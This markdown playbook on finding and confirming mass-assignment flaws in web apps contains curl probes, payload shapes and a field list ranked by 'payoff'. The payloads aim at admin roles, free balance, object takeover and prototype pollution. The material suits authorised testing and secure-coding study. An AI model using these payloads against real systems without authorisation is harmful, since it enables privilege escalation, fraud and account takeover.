# Mass assignment — the binder trusts the body's field set, not the form's

The model binds every field in the request body — including fields the form
never sends. The gap between the model's field list and the form's field
list is the candidate surface.

## The mechanism

```
POST /register
{"username": "x", "password": "y", "role": "admin"}
          ^^^^^^^ the form sends these — ^^^^ the model also binds this
```

The binder (`shouldBindJSON`, `bind`, `Object.assign`, `new User(body)`)
accepts every key in the body. The form sends `username` and `password`;
the model also has `role`, `isAdmin`, `balance`, `verified`. The gap is the
attack surface.

## The detection

### Field-list gap

```bash
# the form's field list — from the HTML, the JS, or the captured request
grep -o 'name="[a-zA-Z_]*"' form.html

# the model's field list — from the source, the API response, or the error
curl -s $BASE/api/user/1 | jq 'keys'
```

The gap is the fields in the model that are not in the form. Common gaps:
`role`, `isAdmin`, `admin`, `balance`, `verified`, `permissions`, `group`,
`isVerified`, `is_active`, `plan`, `tier`, `credits`, `flags`.

### The binder signatures

White-box — read the handler's binding:

```javascript
// Node.js / Express — binds everything
const user = new User(req.body);
Object.assign(user, req.body);

// Go / Gin — ShouldBindJSON binds every exported field
var user User
c.ShouldBindJSON(&user)

// Python / Flask — binds the dict
user = User(**request.json)

// Ruby / Rails — strong params or mass-assign
User.new(params[:user])           # with permit() — allowlist
User.new(params.require(:user).permit!)  # DANGEROUS — permit all
```

The allowlist is the falsifier: `params.require(:user).permit(:name, :email)`
binds only the named fields.

## The probe

```bash
# baseline — the form's fields only
curl -i -b "$JAR" -X POST "$BASE/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"probe1","password":"x"}'

# the candidate — plus one field the model has but the form omits
curl -i -b "$JAR" -X POST "$BASE/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"probe2","password":"x","role":"admin"}'

# read the state back — did the field stick?
curl -i -b "$JAR" "$BASE/api/user/probe2" | jq .
```

## The confirmation

The extra field changed state — the created user has `role: admin`, or
`balance: 1000000`, or `verified: true`. The evidence is the verbatim
response showing the field's value — `GET /api/user` or the response to
`POST /register` itself.

```
HTTP/1.1 200 OK
{"id": 42, "username": "probe2", "role": "admin", "balance": 1000000}
```

## The falsifier

The handler reads an explicit allowlist of fields and ignores everything
else — the response shows the field unset, or a `400` naming the unknown
field:

```
HTTP/1.1 400 Bad Request
{"error": "unknown field: role"}
```

or the created object carries the default:

```
HTTP/1.1 200 OK
{"id": 42, "username": "probe2", "role": "user", "balance": 0}
```

## The field dictionary

Ordered by how often they pay:

| Field | The payoff | Where it appears |
|---|---|---|
| `role` | admin access | user models, register, update |
| `isAdmin` / `is_admin` | admin access | user models |
| `admin` | admin access | user models |
| `balance` | free credit | wallet, account models |
| `verified` / `isVerified` | skip verification | user models |
| `permissions` | broad access | user, role models |
| `plan` / `tier` | paid features | subscription models |
| `credits` | free credit | account models |
| `flags` | flag access | challenge models |
| `owner` / `ownerId` | object takeover | any owned object |
| `id` | overwrite an existing object | update endpoints |
| `__proto__` | prototype pollution | JS binders |
| `constructor` | prototype pollution | JS binders |
| `password` of another user | takeover on update | update endpoints |

## The delivery shapes

```bash
# JSON body
-d '{"username":"x","role":"admin"}'

# form-encoded — the binder may flatten or not
-d 'username=x&role=admin'

# nested JSON — the binder may recurse
-d '{"username":"x","profile":{"role":"admin"}}'

# array-index trick — for binders that accept arrays
-d 'user[username]=x&user[role]=admin'

# dotted path — for binders that expand dots
-d 'username=x&profile.role=admin'
```

## The negative-results ledger

| The observation | What it means | The next move |
|---|---|---|
| field silently ignored | allowlist or binder drops unknown keys | try a different field name — `admin`, `isAdmin`, `is_admin` |
| `400 unknown field` | strict binder — allowlist enforced | falsifier for this endpoint; try a different endpoint |
| field set but not honored | the field exists but nothing reads it | find the endpoint that reads it |
| `200` but no state change | the binder ignored the field | try the nested or array delivery |

## The traps

- **A `200` without a state change is not a confirmation.** The binder may
  have ignored the field entirely. Read the state back through the account's
  normal view.
- **Field names are framework-shaped.** `isAdmin` for JS camelCase,
  `is_admin` for Python/Ruby snake_case, `admin` everywhere.
- **The binder may flatten or not.** `user[role]` works on Rails-style
  binders; `{"user":{"role":...}}` works on JSON binders; `profile.role`
  works on dot-expanding binders.
- **Test on an object you created.** Do not modify another user's record
  until the field boundary is proven on your own object.
